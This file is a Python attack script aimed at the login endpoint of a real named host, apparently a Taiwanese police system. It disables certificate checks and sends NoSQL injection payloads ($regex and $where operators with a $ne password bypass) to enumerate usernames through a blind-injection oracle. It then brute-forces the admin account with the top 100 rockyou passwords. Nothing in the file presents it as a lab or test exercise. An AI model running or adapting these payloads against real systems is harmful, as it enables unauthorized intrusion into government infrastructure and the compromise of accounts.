import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    r=s.post(BASE+"/login", json=body, timeout=10)
    return r.status_code, r.text[:50]

print("=== 布尔盲注探测: username $regex 前缀匹配 (403=多文档/500=少文档) ===")
# 若 username 以某前缀开头的文档 >=2 -> 403; 否则 500
for prefix in ["a","A","t","e","p","d","b","u","1","x"]:
    body={"username":{"$regex":"^"+prefix},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    sc,tx=login(body); time.sleep(0.08)
    print(f"  username~^{prefix:2s} -> {sc}  {tx}")

print("\n=== $where 布尔表达式 (username 长度判断) ===")
for expr in ['this.length>5','this.length>10','this=="admin"','this.startsWith("a")']:
    body={"username":{"$where":expr},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    try:
        sc,tx=login(body); time.sleep(0.08)
        print(f"  $where({expr:22s}) -> {sc}  {tx}")
    except Exception as e:
        print(f"  $where({expr}) ERR {repr(e)[:30]}")

print("\n=== 密码爆破登录 (admin + rockyou top 100) ===")
top=[l.strip() for l in open("rockyou.txt",encoding="utf-8",errors="ignore")][:100]
for pw in top:
    if not pw: continue
    body={"username":"admin","password":pw,"captcha":"1","domain":"AUTH_SERVER"}
    sc,tx=login(body); time.sleep(0.03)
    if sc not in (500,403):  # 非崩溃/非source -> 可能密码相关
        print(f"  admin:{pw} -> {sc} {tx}")
print("  (admin top100 无异常则全为 500/403)")
print("DONE")
